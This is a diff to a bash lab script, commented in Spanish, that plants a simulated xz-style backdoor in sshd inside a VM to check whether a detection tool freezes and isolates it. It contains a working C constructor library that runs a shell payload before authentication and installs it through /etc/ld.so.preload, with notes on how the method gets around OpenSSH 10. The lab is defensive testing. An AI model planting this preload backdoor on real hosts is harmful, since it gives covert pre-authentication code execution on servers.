@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
-# Lab de DEC#13: el patrón de la puerta trasera de xz, de verdad. Una librería cargada en sshd (LD_PRELOAD
-# por un drop-in) ejecuta una orden antes de autenticar, en la copia de sshd de cada conexión. Arx tiene
+# Lab de DEC#13: el patrón de la puerta trasera de xz, de verdad. Una librería cargada en sshd (por
+# /etc/ld.so.preload) ejecuta una orden antes de autenticar, en el proceso de cada conexión. Arx tiene
 # que congelarla en milisegundos (la orden espera 200 ms antes de dejar su marca: si la marca aparece,
 # Arx llegó tarde), dar la alerta crítica y aislarla. Retirado el drop-in, los logins vuelven.
 # Solo en la VM del lab: es una puerta trasera simulada.
@@ -20,7 +20,7 @@ check() { local d="$1"; shift; if "$@"; then pass "$d"; else fail "$d"; fi; }
 wait_for() { local n="$1"; shift; local i; for i in $(seq "$n"); do "$@" && return 0; sleep 1; done; return 1; }
 fresh_login() { ssh -F "$SSHCFG" -o ControlMaster=no -o ControlPath=none -o ConnectTimeout=10 "lima-$VM" true; }
 incident() { local out; out=$(v cat /var/lib/arx/incidents.jsonl 2>/dev/null); grep -q "$1" <<<"$out"; }
-unplant() { v bash -c 'rm -f /etc/systemd/system/ssh.service.d/xz-lab.conf; rmdir /etc/systemd/system/ssh.service.d 2>/dev/null
+unplant() { v bash -c 'rm -f /etc/ld.so.preload /etc/systemd/system/ssh.service.d/xz-lab.conf; rmdir /etc/systemd/system/ssh.service.d 2>/dev/null
   systemctl daemon-reload; systemctl restart ssh
   for c in /sys/fs/cgroup/arxconfine.slice/arxconfine-*.scope; do echo 1 > $c/cgroup.kill; done 2>/dev/null
   pkill -KILL -f "xz-lab-payloa[d]"; true'; }
@@ -41,17 +41,20 @@ cat > /tmp/xz-lab.c <<'EOF'
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-/* Solo en la copia de sshd de cada conexión (-R), antes de autenticar: como la puerta trasera de xz. */
+/* Solo en el proceso de cada conexión, antes de autenticar: como la puerta trasera de xz. OpenSSH 9 se
+   reejecuta con -R; OpenSSH 10 ejecuta sshd-session. */
 __attribute__((constructor)) static void hook(void) {
-    char buf[4096] = {0};
+    char buf[4096] = {0}, exe[512] = {0};
     int fd = open("/proc/self/cmdline", O_RDONLY);
     if (fd < 0) return;
     ssize_t n = read(fd, buf, sizeof buf - 1);
     close(fd);
-    int rexec = 0;
+    int conn = 0;
     for (ssize_t i = 0; i < n; i += strlen(buf + i) + 1)
-        if (strcmp(buf + i, "-R") == 0) rexec = 1;
-    if (!rexec) return;
+        if (strcmp(buf + i, "-R") == 0) conn = 1;
+    ssize_t m = readlink("/proc/self/exe", exe, sizeof exe - 1);
+    if (m > 13 && strcmp(exe + m - 13, "/sshd-session") == 0) conn = 1;
+    if (!conn) return;
     unsetenv("LD_PRELOAD");
     system("/bin/sh /usr/local/lib/xz-lab-payload.sh");  /* la orden la decide el lab en cada escenario */
 }
@@ -72,9 +75,9 @@ check "vigila cada exec desde el kernel" wait_for 20 kernel_watch
 check "precondición: un login nuevo funciona" fresh_login
 
 step "sshd con la librería: la conexión siguiente ejecuta algo antes de autenticar"
-v bash -c 'mkdir -p /etc/systemd/system/ssh.service.d
-  printf "[Service]\nEnvironment=LD_PRELOAD=/usr/local/lib/xz-lab.so\n" > /etc/systemd/system/ssh.service.d/xz-lab.conf
-  systemctl daemon-reload; systemctl restart ssh'
+# /etc/ld.so.preload, como hace el malware real: OpenSSH 10 no pasa su entorno a sshd-session, así que un
+# LD_PRELOAD en el unit no llegaría. La librería solo actúa en el proceso de cada conexión
+v sh -c 'echo /usr/local/lib/xz-lab.so > /etc/ld.so.preload'
 ( fresh_login >/dev/null 2>&1 & )   # el atacante llama a la puerta; esta conexión se quedará colgada
 frozen() { local out; out=$(v sh -c 'for p in $(pgrep -f "xz-lab-payloa[d]"); do ps -o stat= -p $p; done'); grep -q T <<<"$out"; }
 check "la orden queda congelada" wait_for 30 frozen
